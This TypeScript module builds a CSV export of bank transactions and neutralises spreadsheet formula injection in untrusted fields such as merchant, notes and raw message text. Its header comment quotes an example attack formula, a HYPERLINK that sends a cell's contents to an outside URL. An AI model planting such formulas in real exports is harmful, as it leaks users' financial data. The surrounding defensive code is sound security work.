import { bruneiMonthKey, convertAmount, rateAt, type FxTable } from './fx';

/**
 * CSV rendering for the transactions export — the pure half, split out of
 * `exportCsv.ts` so it can be unit-tested without expo-file-system, expo-sharing
 * or a Supabase client (the same shape as `txFilters.ts` and `subscriptions.ts`).
 *
 * Two separate concerns live here, and conflating them is what made the export
 * unsafe:
 *
 *   • **Quoting** — RFC 4180. A field containing a comma, a quote or a newline
 *     is wrapped and its quotes doubled, so the file parses back correctly.
 *     This was always right, and it does nothing for the problem below.
 *
 *   • **Formula neutralisation** — a spreadsheet treats a cell beginning with
 *     `=`, `+`, `-`, `@`, tab or CR as a *formula*, quoted or not. Quoting is
 *     not a defence; only changing the leading character is.
 *
 * Why that matters here specifically. The transaction fields are not trusted
 * input: the iOS capture automation is set up to fire on any message matching a
 * bank's format regardless of sender (Settings > Capture, step 4), and the
 * Baiduri merchant pattern captures everything between its labels. So anyone
 * who knows a user's phone number can text them a message whose `merchant`
 * reads `=HYPERLINK("http://…"&A2,"Receipt")`, and it lands in the ledger.
 * Export, open in Excel, and the sheet is running an attacker's formula against
 * the owner's own spending history.
 *
 * `csvText` is therefore used for every field a message or a user can write,
 * and `csvField` for the ones this app generates. The split is deliberate
 * rather than neutralising everything: a legitimate incoming transaction has a
 * negative amount, and prefixing `-12.50` would turn a number into text and
 * break every sum in the exported sheet. Neutralising the wrong column is its
 * own bug.
 */

export const CSV_HEADER = [
  'date',
  'time',
  'amount',
  'currency',
  'merchant',
  'category',
  'bank',
  'card_last4',
  'source',
  'status',
  'notes',
  'raw_text',
];

/**
 * Extra columns, appended only when the caller supplies rates. Always adding
 * them would mean every export carries four empty columns for a feature most
 * people leave off; never adding them would mean a converted total cannot be
 * reconciled against the rows that produced it.
 */
export const CSV_FX_HEADER = [
  'primary_currency',
  'converted_amount',
  'fx_rate_month',
  'fx_approximate',
];

export interface CsvFxContext {
  /** The currency `converted_amount` is expressed in. */
  currency: string;
  table: FxTable;
}

/** Leading formula trigger, allowing for whitespace a spreadsheet would trim. */
const FORMULA_LEAD = /^[\s ]*[=+\-@\t\r]/;

/**
 * RFC 4180 quoting only. For values this app produces — dates, amounts,
 * enums — where a leading `-` is a legitimate negative number.
 */
export function csvField(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';
  const s = String(value);
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/**
 * Quoting *and* formula neutralisation. For every value that originated in a
 * bank message or in something the user typed.
 *
 * The apostrophe is the standard neutraliser: spreadsheets read it as "treat
 * the rest as literal text" and do not display it. It costs an exact
 * round-trip for programmatic re-import of an affected cell, which is the
 * right trade — no bank message legitimately begins with `=`.
 */
export function csvText(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';
  const s = String(value);
  return csvField(FORMULA_LEAD.test(s) ? `'${s}` : s);
}

export interface CsvTransaction {
  occurred_at: string | null;
  amount: number | string | null;
  currency: string;
  merchant: string | null;
  category_id: string | null;
  bank: string;
  card_last4: string | null;
  source: string;
  parse_status: string;
  notes: string | null;
  raw_text: string;
}

export interface CsvFormatters {
  /** ISO instant → 'YYYY-MM-DD' in Brunei time. */
  day: (iso: string) => string;
  /** ISO instant → 'HH:MM' in Brunei time. */
  time: (iso: string) => string;
}

/**
 * The four FX cells for one row. A row already in the primary currency gets a
 * blank converted amount rather than a duplicate — `amount` is already the
 * answer, and repeating it invites a spreadsheet sum that double-counts.
 */
function fxFields(tx: CsvTransaction, fx: CsvFxContext): string[] {
  const primary = fx.currency;
  if (
    tx.amount === null ||
    !tx.occurred_at ||
    tx.currency.toUpperCase() === primary.toUpperCase()
  ) {
    return [csvField(primary), '', '', ''];
  }

  const month = bruneiMonthKey(tx.occurred_at);
  const converted = convertAmount(Number(tx.amount), tx.currency, primary, month, fx.table);
  const resolved = rateAt(fx.table, tx.currency, month);

  return [
    csvField(primary),
    converted === null ? '' : csvField(converted.toFixed(2)),
    csvField(resolved?.month ?? ''),
    csvField(resolved ? String(resolved.month < month) : ''),
  ];
}

export function buildCsv(
  txs: CsvTransaction[],
  categoryNameById: Map<string, string>,
  fmt: CsvFormatters,
  fx?: CsvFxContext,
): string {
  const lines = [fx ? [...CSV_HEADER, ...CSV_FX_HEADER].join(',') : CSV_HEADER.join(',')];
  for (const tx of txs) {
    const fields = [
      csvField(tx.occurred_at ? fmt.day(tx.occurred_at) : null),
      csvField(tx.occurred_at ? fmt.time(tx.occurred_at) : null),
      csvField(tx.amount === null ? null : Number(tx.amount).toFixed(2)),
      csvField(tx.currency),
      csvText(tx.merchant),
      csvText(tx.category_id ? (categoryNameById.get(tx.category_id) ?? '') : null),
      csvField(tx.bank),
      csvField(tx.card_last4),
      csvField(tx.source),
      csvField(tx.parse_status),
      csvText(tx.notes),
      csvText(tx.raw_text),
    ];
    if (fx) fields.push(...fxFields(tx, fx));
    lines.push(fields.join(','));
  }
  return lines.join('\r\n') + '\r\n';
}
